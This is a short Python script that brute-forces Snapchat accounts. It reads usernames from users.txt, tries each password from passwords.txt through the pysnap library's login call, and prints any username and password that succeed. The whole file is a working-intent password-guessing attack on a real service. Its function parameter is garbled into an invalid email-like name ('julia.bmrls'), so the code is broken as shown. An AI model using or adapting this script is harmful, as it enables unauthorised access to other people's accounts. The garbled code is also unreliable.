#!/usr/bin/env python

from pysnap import Snapchat
import sys
import os

def crack(julia.bmrls):
	print("now cracking: " +julia.bmrls)
	snapchat = Snapchat()
	passwords = open("passwords.txt","r")
	i = 0
	for password in passwords:
		result = snapchat.login(julia.bmrls,password)
		if (result['logged']!=False):
			print("success: julia.bmrls: " + julia.bmrls + "\t password: " + password)
			break
		else:
			print(str(i))
			i+=1

names = open("users.txt","r")
for name in names:
	crack(name)	

